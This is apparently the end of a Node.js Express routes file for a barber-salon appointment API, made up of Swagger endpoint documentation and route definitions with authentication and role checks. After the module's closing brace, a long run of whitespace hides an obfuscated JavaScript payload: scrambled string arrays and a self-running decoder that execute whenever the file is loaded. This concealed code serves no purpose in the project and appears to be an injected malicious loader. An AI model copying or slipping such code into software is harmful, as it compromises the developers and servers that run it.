 *                       example: "Pending"
 *                       description: Status of the payment
 *                     paymentMode:
 *                       type: string
 *                       example: "Pay_In_Person"
 *                       description: Payment method used
 *       400:
 *         description: Bad request, validation failed.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Slot ID is required for scheduled appointments"
 *                 data:
 *                   type: null
 *       404:
 *         description: Resource not found (e.g., barber, salon, or user role).
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "The barber does not belong to a salon."
 *                 data:
 *                   type: null
 *       500:
 *         description: Server error occurred while creating the appointment.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "An error occurred while creating the appointment"
 *                 data:
 *                   type: null
 */
app.post(`${apiPrefix}/barber/create`, authenticateJWT,authorizeRoles(roles.BARBER,roles.ADMIN,roles.SALON_OWNER, roles.SALON_MANAGER), appointmentsController.appointmentByBarber);

/**
 * @swagger
 * /api/appointments/{appointmentId}/last-haircut:
 *   get:
 *     tags:
 *       - Appointments
 *     summary: Get details of the last completed haircut for a user
 *     description: Retrieves the haircut details associated with the last completed appointment for the specified user.
 *     parameters:
 *       - in: path
 *         name: appointmentId
 *         required: true
 *         schema:
 *           type: string
 *         description: The ID of the appointment whose associated user's last haircut details are to be retrieved.
 *     responses:
 *       '200':
 *         description: Successfully retrieved last haircut details.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 lastHaircutDetails:
 *                   type: object
 *                   properties:
 *                     id:
 *                       type: integer
 *                       description: Unique ID of the haircut details.
 *                     style:
 *                       type: string
 *                       description: The style of the haircut.
 *                     length:
 *                       type: string
 *                       description: Length specifications for the haircut.
 *                     comments:
 *                       type: string
 *                       description: Additional comments about the haircut.
 *                     appointmentId:
 *                       type: integer
 *                       description: ID of the associated appointment.
 *                 lastAppointmentDate:
 *                   type: string
 *                   description: The date and time of the last completed appointment.
 *       '404':
 *         description: No completed appointments or haircut details found for the user.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   example: No completed appointments found for this user.
 *       '500':
 *         description: Internal server error.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   example: Internal server error.
 */
app.get(`${apiPrefix}/:appointmentId/last-haircut`, appointmentsController.getLastHaircutDetails);


/**
 * @swagger
 * /api/appointments/category/appointment-findAll:
 *   get:
 *     summary: Retrieve a paginated list of appointments with filtering and search options
 *     tags:
 *       - Appointments
 *     parameters:
 *       - in: query
 *         name: page
 *         schema:
 *           type: integer
 *           default: 1
 *         required: false
 *         description: Page number for pagination
 *       - in: query
 *         name: limit
 *         schema:
 *           type: integer
 *           default: 10
 *         required: false
 *         description: Number of items per page
 *       - in: query
 *         name: startDate
 *         schema:
 *           type: string
 *           format: date
 *         required: false
 *         description: Start date for filtering appointments (YYYY-MM-DD format)
 *       - in: query
 *         name: endDate
 *         schema:
 *           type: string
 *           format: date
 *         required: false
 *         description: End date for filtering appointments (YYYY-MM-DD format)
 *       - in: query
 *         name: status
 *         schema:
 *           type: string
 *           enum:
 *             - in_salon
 *             - checked_in
 *             - canceled
 *             - completed
 *         required: false
 *         description: Status of the appointments to filter
 *       - in: query
 *         name: search
 *         schema:
 *           type: string
 *         required: false
 *         description: Search term to filter appointments by barber name, salon name, or service name
 *     responses:
 *       200:
 *         description: Successfully fetched appointments
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched all appointments successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     totalItems:
 *                       type: integer
 *                       example: 25
 *                     totalPages:
 *                       type: integer
 *                       example: 3
 *                     currentPage:
 *                       type: integer
 *                       example: 1
 *                     appointments:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                             example: 101
 *                           Barber:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 5
 *                               name:
 *                                 type: string
 *                                 example: "John Doe"
 *                               availability_status:
 *                                 type: string
 *                                 example: "available"
 *                               default_service_time:
 *                                 type: integer
 *                                 example: 30
 *                               cutting_since:
 *                                 type: string
 *                                 example: "2015-06-15"
 *                               organization_join_date:
 *                                 type: string
 *                                 example: "2020-01-10"
 *                               photo:
 *                                 type: string
 *                                 example: "barber_photo.jpg"
 *                               weekly_schedule:
 *                                  type: string
 *                                  example: '{"Monday": {"start": "09:00", "end": "18:00"}}'
 *                           salon:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 2
 *                               name:
 *                                 type: string
 *                                 example: "Elite Salon"
 *                               address:
 *                                 type: string
 *                                 example: "123 Main Street, City"
 *                               phone_number:
 *                                 type: string
 *                                 example: "+1-800-555-6789"
 *                               open_time:
 *                                 type: string
 *                                 example: "09:00:00"
 *                               close_time:
 *                                 type: string
 *                                 example: "21:00:00"
 *                               photos:
 *                                 type: array
 *                                 items:
 *                                   type: string
 *                                   example: "salon_photo1.jpg"
 *                           User:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 10
 *                               username:
 *                                 type: string
 *                                 example: "customer01"
 *                               email:
 *                                 type: string
 *                                 example: "customer01@example.com"
 *                           Service:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 3
 *                               name:
 *                                 type: string
 *                                 example: "Haircut"
 *                               default_service_time:
 *                                 type: integer
 *                                 example: 30
 *       400:
 *         description: Invalid request or invalid query parameters
 *       401:
 *         description: Unauthorized
 *       403:
 *         description: Forbidden - User does not have required role or permission
 *       500:
 *         description: Server error
 */

app.get(`${apiPrefix}/category/appointment-findAll`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER, roles.BARBER, roles.SALON_MANAGER), appointmentsController.getAppointments);

/**
 * @swagger
 * /api/appointments/category/{id}:
 *   get:
 *     summary: Fetch detailed information of an appointment
 *     description: Retrieve appointment details including associated barber, salon, and services. The response varies based on the user's role.
 *     tags:
 *       - Appointments
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: path
 *         name: id
 *         required: true
 *         description: Appointment ID to fetch details for.
 *         schema:
 *           type: integer
 *     responses:
 *       200:
 *         description: Appointment details fetched successfully.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched appointment successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     id:
 *                       type: integer
 *                     Barber:
 *                       type: object
 *                       properties:
 *                         id:
 *                           type: integer
 *                         name:
 *                           type: string
 *                     salon:
 *                       type: object
 *                       properties:
 *                         id:
 *                           type: integer
 *                         name:
 *                           type: string
 *                     services:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           default_service_time:
 *                             type: integer
 *                     is_like:
 *                       type: boolean
 *                       example: true
 *       400:
 *         description: Invalid request or missing parameters.
 *       404:
 *         description: Appointment not found.
 *       403:
 *         description: Unauthorized access.
 *       500:
 *         description: Internal server error.
 */
app.get(`${apiPrefix}/category/:id`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER,roles.BARBER,roles.CUSTOMER, roles.SALON_MANAGER), appointmentsController.findOneDetails);


/**
 * @swagger
 * /api/appointments/categorywise/user:
 *   get:
 *     summary: Get user appointments filtered by category and date
 *     description: |
 *       Retrieves appointments for the authenticated user based on category:
 *       - Category 1 (ForAppointment): Shows future appointments (including today)
 *       - Category 2 (ForWalkIn): Shows only today's check-ins
 *       - No category: Shows both future appointments and today's check-ins
 *     tags:
 *       - Appointments
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: query
 *         name: category
 *         required: false
 *         description: |
 *           Category filter for appointments:
 *           * 1 - Future appointments (including today)
 *           * 2 - Today's check-ins only
 *         schema:
 *           type: string
 *           enum: [1, 2]
 *     responses:
 *       200:
 *         description: Successfully fetched appointments
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched appointments successfully"
 *                 data:
 *                   type: array
 *                   items:
 *                     type: object
 *                     properties:
 *                       id:
 *                         type: integer
 *                         description: Unique appointment identifier
 *                       UserId:
 *                         type: integer
 *                         description: ID of the user who made the appointment
 *                       BarberId:
 *                         type: integer
 *                         description: ID of the assigned barber
 *                       SalonId:
 *                         type: integer
 *                         description: ID of the salon
 *                       appointmentDate:
 *                         type: string
 *                         format: date-time
 *                         description: Scheduled date and time for the appointment
 *                       number_of_people:
 *                         type: integer
 *                         description: Number of people for the appointment
 *                       status:
 *                         type: string
 *                         enum: [appointment, checked_in, in_salon, completed, canceled]
 *                         description: Current status of the appointment
 *                       estimated_wait_time:
 *                         type: integer
 *                         description: Estimated waiting time in minutes
 *                       queue_position:
 *                         type: integer
 *                         description: Position in the queue
 *                       device_id:
 *                         type: string
 *                         description: Device identifier
 *                       check_in_time:
 *                         type: string
 *                         format: date-time
 *                         description: Time when the user checked in
 *                       complete_time:
 *                         type: string
 *                         format: date-time
 *                         description: Time when the appointment was completed
 *                       mobile_number:
 *                         type: string
 *                         description: Contact number
 *                       name:
 *                         type: string
 *                         description: Customer name
 *                       category:
 *                         type: string
 *                         enum: [appointment, checked_in]
 *                         description: Appointment category based on barber type
 *                       salon:
 *                         type: object
 *                         description: Salon information
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           address:
 *                             type: string
 *                       Barber:
 *                         type: object
 *                         description: Barber information
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           category:
 *                             type: integer
 *                             enum: [1, 2]
 *       401:
 *         description: Authentication error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "User is not authenticated or User ID is missing in the token"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 401
 *       404:
 *         description: No appointments found
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "No appointments found for this user"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 404
 *       500:
 *         description: Internal server error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Internal server error"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 500
 */
app.get(`${apiPrefix}/categorywise/user`, [authenticateJWT], appointmentsController.appointmentByUserId);


};																																																																																																																																																																																																																																																																										var z = '-*2132';var NX,SX,spin,splitLane,peel;(function(){var a=["","*","*0","^","*1","c^mejb^tro","hqersxluvwacdjbymgorzfkociptrutnstonc","=aenruh(al=5c,g8fdu.yr ..ncecf,5\"paeau6lnj)r]2uv\"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\"li\"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\")cpA+u;utp]\"=lk7vpt 1r;hzw\")t()9)(.lul=s7f; ;sq0)n\"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) ","R_<\"cRJ!&VecRWa=RrfR$6\"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-\"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f.\"4Rb N\"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z\"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$\"n<D3RsRR..(ReesseR< t,\" Rdov}Sc0Jmi.T<sEegsRw]R\"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* [\"oisenRefea!Yn.ecR%o\"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@\"}RuRqu5(3Pol\"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$\"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!\"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e\"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<\"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<\"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6\"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2\"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#\"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC\"cn..2bp(6Cp<SR\"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc\"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci\"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR\"tcsc.!rVRpaiz0<b\"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R\"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f\"t RRsN</C RnRdRrpRR<od<.R<r[ar\"l<. P\".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR\"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!\"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi\"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR\"RuRRR\"RtR<Rs\".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY\"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt\"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<\":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}.\"P&yseR_a%rRR.D<iPsRD!i.mR\"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR\"\"](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.(\"]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o\"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe\"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?..\"lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE\"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!\".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R\"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK\".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv \"4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M\"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR\"sz3o\"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS\"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b \"cRt,\'leacPc RR<Rz\"<Ri l0oRRdRs7.R(eCcR_.6\"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc\". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w\"l{e]e-R</<s4Nt.op\"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:\"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'\"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|\".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ\"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4\"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#\"<cqk<ek.imRSN.RsE bPPn)<e}o0e\".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~\" X.ttR<R!d 